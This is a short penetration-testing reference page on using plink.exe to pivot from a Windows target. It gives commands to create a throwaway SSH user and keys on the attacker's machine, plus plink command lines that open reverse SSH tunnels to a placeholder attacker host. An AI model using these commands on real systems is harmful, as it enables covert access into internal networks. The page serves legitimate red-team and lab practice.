# plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own built-in SSH client, plink is less useful for modern servers; however, it is still a very useful tool for older computers.

### [Download](../../misc/tools.md#plink.exe)

## Remote Forwarding

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection.

```bash
# Enable the SSH service on your computer:
service ssh start
systemctl start ssh
```

### Method #1

```bash
# Create a non-shell user with a random password:
sudo useradd sshpivot --no-create-home --shell /bin/false
sudo passwd sshpivot # Set a random password
```

```bash
# The first time plink connects to a host, it will try to cache the host key in the registry. Therefore, it is best to pass it the letter "y" at once:
cmd /c echo y | .\plink.exe -ssh -l sshpivot -pw <PASSWORD> -R <LPORT>:<TARGET_IP>:<TARGET_PORT> <LHOST>
```

### Method #2

```bash
# Install:
sudo apt install putty-tools # Ubuntu/Debian
sudo pacman -S putty # Arch Linux
# Generate keys:
ssh-keygen
mv id_rsa.pub authorized_keys
puttygen id_rsa -o id_rsa.ppk
```

The resulting `.ppk` file can be transferred to the Windows target and then, we perform remote forwarding:

```bash
cmd /c echo y | .\plink.exe -R <LPORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<ATTACKER_IP> -i id_rsa.ppk -N
```
